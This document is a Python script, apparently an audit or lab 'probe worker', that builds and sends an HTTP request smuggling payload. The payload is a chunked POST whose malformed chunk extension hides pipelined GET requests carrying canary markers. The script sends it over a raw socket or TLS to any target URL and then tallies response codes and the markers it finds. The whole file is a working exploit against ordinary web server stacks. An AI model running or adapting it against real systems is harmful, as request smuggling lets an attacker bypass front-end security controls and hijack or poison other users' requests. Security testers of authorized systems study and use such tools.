#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import socket
import ssl
from urllib.parse import urlparse


def parse_url(url: str) -> tuple[str, str, int, str]:
    parsed = urlparse(url)
    scheme = parsed.scheme or "http"
    if scheme not in {"http", "https"}:
        raise ValueError(f"unsupported scheme: {scheme}")
    host = parsed.hostname or ""
    if not host:
        raise ValueError("target host is required")
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    return scheme, host, port, path


def build_payload(trigger: str, host: str, client_id: str, hidden_count: int, hidden_path: str) -> tuple[bytes, list[str]]:
    markers: list[str] = []
    parts: list[str] = []
    for i in range(1, hidden_count + 1):
        marker = f"{client_id}-r{i:03d}"
        markers.append(marker)
        parts.append(
            f"GET {hidden_path}?marker={marker} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Audit: RETEST-TC24-MULTIIP\r\n"
            f"X-Lab-Canary: {marker}\r\n"
            "Connection: keep-alive\r\n\r\n"
        )

    smuggled = "".join(parts)
    payload = (
        f"POST {trigger} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: RETEST-TC24-MULTIIP\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n\r\n"
        '1;a="\r\n'
        "X\r\n"
        "0\r\n\r\n"
        f"{smuggled}"
        '"\r\n'
        "Y\r\n"
        "0\r\n\r\n"
    ).encode("utf-8")
    return payload, markers


def send_request(
    *,
    scheme: str,
    connect_host: str,
    port: int,
    request_bytes: bytes,
    timeout: float,
    sni: str | None,
) -> tuple[bytes, str]:
    response = b""
    error = ""
    try:
        raw = socket.create_connection((connect_host, port), timeout=10)
        sock = raw
        if scheme == "https":
            context = ssl.create_default_context()
            sock = context.wrap_socket(raw, server_hostname=sni or connect_host)
        sock.settimeout(timeout)
        sock.sendall(request_bytes)
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            response += chunk
        sock.close()
    except Exception as exc:  # noqa: BLE001
        error = f"{type(exc).__name__}:{exc}"
    return response, error


def main() -> int:
    parser = argparse.ArgumentParser(description="Generic TC-24 multi-client probe worker.")
    parser.add_argument("--target-url", required=True)
    parser.add_argument("--connect-host", help="Optional TCP connect host override for lab service names")
    parser.add_argument("--request-host", help="Optional Host/SNI override")
    parser.add_argument("--trigger-path", help="Override trigger path from target URL")
    parser.add_argument("--hidden-path", default="/")
    parser.add_argument("--hidden-count", required=True, type=int)
    parser.add_argument("--client-id", required=True)
    parser.add_argument("--timeout", default=120.0, type=float)
    args = parser.parse_args()

    scheme, parsed_host, port, parsed_path = parse_url(args.target_url)
    connect_host = args.connect_host or parsed_host
    request_host = args.request_host or parsed_host
    trigger_path = args.trigger_path or parsed_path
    payload, markers = build_payload(trigger_path, request_host, args.client_id, args.hidden_count, args.hidden_path)
    response, error = send_request(
        scheme=scheme,
        connect_host=connect_host,
        port=port,
        request_bytes=payload,
        timeout=args.timeout,
        sni=request_host if scheme == "https" else None,
    )
    summary = {
        "client_id": args.client_id,
        "count_200": response.count(b"HTTP/1.1 200"),
        "count_400": response.count(b"HTTP/1.1 400"),
        "count_403": response.count(b"HTTP/1.1 403"),
        "count_405": response.count(b"HTTP/1.1 405"),
        "count_502": response.count(b"HTTP/1.1 502"),
        "markers_seen": sum(1 for marker in markers if marker.encode() in response),
        "bytes": len(response),
        "error": error,
    }
    print(json.dumps(summary, separators=(",", ":")))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
